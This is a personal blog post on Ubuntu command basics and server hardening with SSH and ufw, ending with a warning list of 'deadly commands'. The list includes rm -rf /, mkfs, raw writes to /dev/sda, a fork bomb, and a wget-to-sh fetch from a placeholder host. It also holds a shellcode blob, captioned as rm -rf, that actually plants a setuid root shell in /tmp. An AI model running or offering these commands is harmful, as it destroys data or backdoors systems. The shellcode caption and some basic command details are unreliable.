---
layout: post
title: Linux basics
---

# Ubuntu Linux basics

Hey, want to learn some Linux commands? Me neither.

***
<hr class="rule">

## Looking around

List all with attributes and permissions

    ls -la

List files with size

    ls -h

***

## Moving around

Remove folder

    rm -r folder-name


Remove folder with no prompt. Be **extremely** careful with the `rm -rf` command because you can wipe out the whole system with it. See more in the **deadly commands** * section.

    rm -rf folder-name

Rename folder or files

    mv old-name new-name

Move file somewhere else

    mv file-name /somewhere-else

Move folder somewhere else

    mv -R folder-name /somewhere-else

<hr class="rule">

***

# Server settings

Based on a typical [digitalocean](https://www.digitalocean.com/help/getting-started/setting-up-your-server/) Ubuntu droplet. There are also some good resources to look into at [Linode](https://www.linode.com/docs/security/securing-your-server), depending on how each is deployed.

***

## Add a new user with root privileges

Login as root and type:

    adduser newuser

Follow the prompt and create a strong password. Now add the new user to the sudo group.

    gpasswd -a newuser sudo

***

## Configure SSH Daemon

Modify the SSH daemon configuration (the program that allows remote login) to disallow remote SSH access to the root account.

Open the configuration file:

    nano /etc/ssh/sshd_config

Locate line:

    PermitRootLogin yes

Modify this line to:

    PermitRootLogin no

**Reload SSH**

    service ssh restart

***

## Configure Uncomplicated Firewall (ufw)

This sets up the bare minimum without SSL/TLS or SMTP opened. Full config docs from digitalocean is over [here](https://www.digitalocean.com/community/tutorials/how-to-setup-a-firewall-with-ufw-on-an-ubuntu-and-debian-cloud-server).

Create an exception for SSH connections so that we can maintain access for remote administration.

The SSH daemon runs on port 22 by default and `ufw` can implement a rule by name if the default has not been changed. So if you have not modified SSH port, you can enable the exception by typing:

    sudo ufw allow ssh

Allow only specific IP addresses if you want:

    sudo ufw allow from 192.168.255.255

Allow access to port 80 for a HTTP web server:

    sudo ufw allow 80/tcp

Review selections:

    sudo ufw show added

Enable firewall:

    sudo ufw enable

Check status:

    sudo ufw status verbose

***

# Deadly commands *

Someday, some asshole on a forum may try to ruin your life by tricking you into using these commands. Take a hard look and remember them. **Never** run any of the following:

***

## Delete all files in the root directory

    rm -rf /

This freaks me out just to write it. This means force a deletion of everything in the root directory and all subfolders without prompt. So basically wiping your entire system in 5 lines of code.

There is "hidden" hex of this as well that looks like this.

    char esp[] __attribute__ ((section(“.text”))) /* e.s.p
    release */
    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
    “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
    “cp -p /bin/sh /tmp/.beyond; chmod 4755
    /tmp/.beyond;”;

***

## Reformat Data on device

    mkfs
    mkfs.ext3
    mkfs.anything

Whatever follows the mkfs command will be destroyed and replaced with a blank filesystem.

***

## Block device manipulation

    any_command > /dev/sda
    dd if=something of=/dev/sda

Watch out for `/dev/sda` These commands cause raw data to be written to a block device. Often this will clobber the filesystem and cause total loss of data.

Another similar command would be to drop all files into a black hole.

    mv ~ /dev/null

***

## Fork bomb

    :(){:|:&};:

This short line defines a shell function that creates new copies of itself until the system freezes, forcing a hard reset of the computer. Basically an internal DDOS attack.

***

## Malicious code in Shell scripts

    wget http://some_place/some_file -O- | sh

Or similarly

    wget http://some_place/some_file
    sh ./some_file

This may be trickier to spot as there are so many tools out there as package managers. Bottom line is don't execute a shell script from a fishy source. Mind the `-O- | sh` or `sh ./` commands.

***

<p>* The deadly commands are only posted for my personal warnings and I'm not responsible for any blowings up of people's systems. This information is pretty easy to dig up, so I'm not the one who released them into the wild.</p>
